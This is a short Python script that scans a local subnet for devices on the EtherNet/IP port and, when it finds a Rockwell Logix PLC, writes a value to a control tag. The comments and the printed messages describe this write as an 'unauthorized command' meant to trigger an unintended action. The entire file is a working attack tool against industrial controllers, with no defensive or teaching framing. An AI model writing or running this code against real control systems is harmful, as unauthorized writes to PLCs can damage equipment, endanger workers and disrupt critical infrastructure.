import socket
import pycomm3
from pycomm3 import LogixDriver

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet to scan (e.g., 192.168.1.0/24)
    subnet = "192.168.1."
    
    # Scan the subnet for devices
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        try:
            # Attempt to connect to the PLC
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((ip, 44818))  # 44818 is the default port for EtherNet/IP
                if result == 0:
                    print(f"PLC found at IP: {ip}")
                    return ip
        except socket.error:
            continue
    print("PLC not found in the specified subnet.")
    return None

# Function to send an unauthorized command to the PLC
def send_unauthorized_command(plc_ip):
    try:
        # Connect to the PLC
        with LogixDriver(plc_ip) as plc:
            # Example of an unauthorized command: Set a tag to a value that triggers an unintended action
            # Replace 'ControlTag' with the actual tag name and '1' with the value to set
            plc.write('ControlTag', 1)
            print(f"Unauthorized command sent to PLC at IP: {plc_ip}")
    except Exception as e:
        print(f"Failed to send unauthorized command: {e}")

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip:
        # Send an unauthorized command to the PLC
        send_unauthorized_command(plc_ip)

if __name__ == "__main__":
    main()